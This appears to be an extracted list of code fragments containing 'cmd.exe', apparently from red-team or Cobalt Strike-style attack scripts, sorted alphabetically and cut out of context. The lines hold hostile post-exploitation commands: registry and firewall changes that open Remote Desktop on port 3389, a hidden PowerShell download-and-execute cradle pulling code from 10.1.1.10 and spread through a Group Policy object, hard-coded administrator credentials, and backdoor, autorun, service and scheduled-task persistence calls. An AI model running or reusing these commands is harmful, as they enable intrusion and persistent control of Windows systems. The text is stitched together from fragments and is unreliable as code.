"cmd.exe /c "" & cmd "
"cmd.exe /c "" & cmd & "" > "" & file"
"cmd.exe /c REG ADD \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"" /v fDenyTSConnections /t REG_DWORD /d 0 /f\'"");"
"cmd.exe /c REG ADD \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"" /v fDenyTSConnections /t REG_DWORD /d 1 /f\'"");"
"cmd.exe /c calc"",domain => ""."",user => ""administrator"",pass => ""123456"",bid => $bid), &SCshell);	"
"cmd.exe /c netsh advfirewall firewall add rule name=\""Remote Desktop\"" protocol=TCP dir=in localport=3389 action=allow\'"");"
"cmd.exe"" &chr(34)&""""&chr(10)&_"
"cmd.exe"", """","
"cmd.exe"",Arguments => ""/c powershell.exe -nop -w hidden -c \""IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"""",GPOName => ""Default Server Policy"",bid => $bid), &SharpGPOAbuse_task);"
"cmd.exe"",args => ""\""whoami\"""",bid => $bid), &SharpExec_cmd);"
"cmd.exe"",bid => $bid),&InstallAutoRun);"
"cmd.exe"",bid => $bid),&InstallBackDoor);"
"cmd.exe"",bid => $bid),&InstallService);"
"cmd.exe\"" -a \""/c $3['payload']\"" -n \""$3['schtask_name']\"" -m add -o $3['schtask_time']""));"
"cmd.exe\"" -a \""/c $3['payload']\"" -n \""$3['schtask_name']\"" -m add""));"
"cmd.exe\"" -a \""/c $3['payload']\"" -n \""$3['service_name']\"" -m add""));"
cmd.exe and run it from there.
